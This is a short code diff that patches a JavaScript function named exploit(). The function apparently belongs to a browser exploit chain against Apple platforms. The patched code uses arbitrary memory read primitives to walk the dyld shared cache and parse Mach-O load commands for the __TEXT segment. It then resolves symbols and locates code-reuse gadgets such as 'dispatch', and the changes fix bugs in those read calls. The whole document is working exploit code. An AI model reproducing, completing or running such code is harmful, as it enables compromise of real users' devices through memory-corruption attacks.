@@ -690,7 +690,7 @@ function exploit(){
             var straddr = off2addr(dcache_segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
             var fn = function(i)
             {
-                return memory.copyfrom(Add(straddr, i),0,1);
+                return memory.copyfrom(Add(straddr, i),0,1)[0];
             };
             var base = Add(memory.read_i64(Add(imgs, i * 0x20)),cache_slide);
             log(base)
@@ -700,7 +700,7 @@ function exploit(){
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
                 {
                     var cmd = memory.u32(Add(base, off));
-                    if(cmd == 0x19 && strcmp(memory.copyfrom(Add(base, off + 0x8), 0x10), "__TEXT")) // LC_SEGMENT_64
+                    if(cmd == 0x19 && strcmp(memory.copyfrom(Add(base, off + 0x8),0, 0x10), "__TEXT")) // LC_SEGMENT_64
                     {
                         var nsects = memory.u32(Add(base, off + 0x40));
                         for(var k = 0, o = off + 0x48; k < nsects; ++k)
@@ -788,7 +788,7 @@ function exploit(){
             }
             if(lookup != null)
             {
-                fsyms(memory, base, segs, lookup, syms);
+                fsyms(memory, base, dcache_segs, lookup, syms);
             }
         }
         if(!gadgets['dispatch'])
@@ -820,6 +820,7 @@ function exploit(){
                 fail(s);
             }
         }
+        log("...")
 
         
     }
